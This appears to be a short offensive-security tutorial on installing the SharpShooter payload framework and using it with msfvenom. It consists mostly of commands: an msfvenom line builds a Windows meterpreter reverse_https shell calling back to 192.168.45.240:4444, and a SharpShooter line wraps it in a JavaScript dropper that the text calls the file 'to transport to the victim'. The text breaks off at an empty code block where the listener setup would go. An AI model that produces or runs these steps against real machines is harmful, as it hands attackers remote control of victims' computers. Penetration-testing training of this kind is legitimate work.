### What is SharpShooter.

SharpShooter is a payload creation framework for CSharp source code in several formats (HTA, JS, VBS among others).


#### Instalation.

The instalation requieres Python2 and it can be kind of tricky, we follow the following steps:

```
wget https://bootstrap.pypa.io/pip/2.7/get-pip.py
sudo python2 get-pip.py
sudo python2 -m pip install --upgrade setuptools
sudo python2 -m pip install jsmin
cd /opt/
sudo git clone https://github.com/mdsecactivebreach/SharpShooter.git
cd SharpShooter/
sudo python2 -m pip install -r requirements.txt
```


#### Usage.

Now, to usage it, we create a msfvenom payload:

```
sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.240 LPORT=4444 -f raw -o /var/www/html/shell.txt
```
And use SharpShooter

```
sudo python2 SharpShooter.py --payload js --dotnetver 4 --stageless --rawscfile /var/www/html/shell.txt --output test   
```

This will develop a 'test.js' file which is in fact the executable to transport to the victim. The connection can be retrieved with a handler with msfconsole:

```
